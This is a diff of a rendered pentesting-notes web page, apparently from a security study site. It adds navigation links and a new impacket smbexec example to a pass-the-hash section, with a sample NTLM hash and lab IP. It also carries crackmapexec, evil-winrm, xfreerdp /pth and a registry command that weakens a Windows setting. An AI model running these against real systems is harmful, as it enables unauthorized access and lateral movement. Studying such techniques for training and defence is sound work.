@@ -22,7 +22,7 @@
       
       
       <link rel="icon" href="../img/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.11">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.12">
     
     
       
@@ -30,7 +30,7 @@
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.4af4bdda.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.2afb09e1.min.css">
       
         
         <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
@@ -20481,6 +20481,12 @@
       
         
       
+        
+      
+        
+      
+        
+      
     
     
     
@@ -21824,6 +21830,75 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pillaging-windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pillaging
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../citrix-breakout/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Restricted environments- Citrix breakout
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../user-interaction-windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    User interaction
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -22300,36 +22375,44 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Download from:  <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py</a></p>
 <h3 id="pass-the-hash-with-impacket-smbexec">Pass the Hash with  impacket-smbexec</h3>
 <p>Download from: <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py</a></p>
-<h2 id="pass-the-hash-with-crackmapexec-linux">Pass the Hash with CrackMapExec (Linux)</h2>
-<p>See <a href="../crackmapexec/">CrackMapExec</a></p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
 <span class="normal"><a href="#__codelineno-6-2">2</a></span>
 <span class="normal"><a href="#__codelineno-6-3">3</a></span>
-<span class="normal"><a href="#__codelineno-6-4">4</a></span>
-<span class="normal"><a href="#__codelineno-6-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="c"># Using a hash instead of a password, to authenticate ourselves</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$ip</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="c"># Execute commands with flag -x</span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$ip</span><span class="p">/</span><span class="n">24</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">Administrator</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">.</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span> <span class="n">-x</span> <span class="n">whoami</span>
+<span class="normal"><a href="#__codelineno-6-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>python3<span class="w"> </span>smbexec.py<span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLMhash</span><span class="w"> </span>Administrator@&lt;TARGET-IP&gt;
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="c1"># Example:</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>python3<span class="w"> </span>smbexec.py<span class="w"> </span>-hashes<span class="w"> </span>:bac9dc5b7b4bec1d83e0e9c04b477f26<span class="w"> </span>Administrator@10.129.138.81
+</span></code></pre></div></td></tr></table></div>
+<h2 id="pass-the-hash-with-crackmapexec-linux">Pass the Hash with CrackMapExec (Linux)</h2>
+<p>See <a href="../crackmapexec/">CrackMapExec</a></p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span>
+<span class="normal"><a href="#__codelineno-7-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="c"># Using a hash instead of a password, to authenticate ourselves</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$ip</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="c"># Execute commands with flag -x</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$ip</span><span class="p">/</span><span class="n">24</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">Administrator</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">.</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span> <span class="n">-x</span> <span class="n">whoami</span>
 </span></code></pre></div></td></tr></table></div>
 <h2 id="pass-the-hash-with-evil-winrm-linux">Pass the Hash with evil-winrm (Linux)</h2>
 <p>See <a href="../evil-winrm/">evil-winrm</a>.</p>
 <p>If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;hash&gt;
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;hash&gt;
 </span></code></pre></div></td></tr></table></div>
 <h2 id="pass-the-hash-with-rdp-linux">Pass the Hash with RDP (Linux)</h2>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
-<span class="normal"><a href="#__codelineno-8-2">2</a></span>
-<span class="normal"><a href="#__codelineno-8-3">3</a></span>
-<span class="normal"><a href="#__codelineno-8-4">4</a></span>
-<span class="normal"><a href="#__codelineno-8-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>xfreerdp<span class="w"> </span><span class="o">[</span>/d:domain<span class="o">]</span><span class="w"> </span>/u:&lt;username&gt;<span class="w"> </span>/pth:&lt;hash&gt;<span class="w"> </span>/v:<span class="nv">$ip</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="c1"># /pth:&lt;hash&gt;   Pass the hash</span>
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a><span class="c1"># Example:</span>
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="c1"># xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span>
+<span class="normal"><a href="#__codelineno-9-3">3</a></span>
+<span class="normal"><a href="#__codelineno-9-4">4</a></span>
+<span class="normal"><a href="#__codelineno-9-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>xfreerdp<span class="w"> </span><span class="o">[</span>/d:domain<span class="o">]</span><span class="w"> </span>/u:&lt;username&gt;<span class="w"> </span>/pth:&lt;hash&gt;<span class="w"> </span>/v:<span class="nv">$ip</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="c1"># /pth:&lt;hash&gt;   Pass the hash</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="c1"># Example:</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="c1"># xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B</span>
 </span></code></pre></div></td></tr></table></div>
 <p><strong>Restricted Admin Mode</strong>, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</code> with the value of 0. It can be done using the following command:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRestrictedAdmin</span> <span class="p">/</span><span class="n">d</span> <span class="n">0x0</span> <span class="p">/</span><span class="n">f</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRestrictedAdmin</span> <span class="p">/</span><span class="n">d</span> <span class="n">0x0</span> <span class="p">/</span><span class="n">f</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.</p>
 <h2 id="uac-limits-pass-the-hash-for-local-accounts">UAC Limits Pass the Hash for Local Accounts</h2>
@@ -22340,7 +22423,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="January 18, 2025 19:59:20"><span class="timeago" datetime="2025-01-18T19:59:20+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="January 18, 2025 19:59:20">2025-01-18</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="April 24, 2025 18:41:39"><span class="timeago" datetime="2025-04-24T18:41:39+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="April 24, 2025 18:41:39">2025-04-24</span></small></br>
 
 
     <small>Created: August 17, 2023 10:53:26</small>
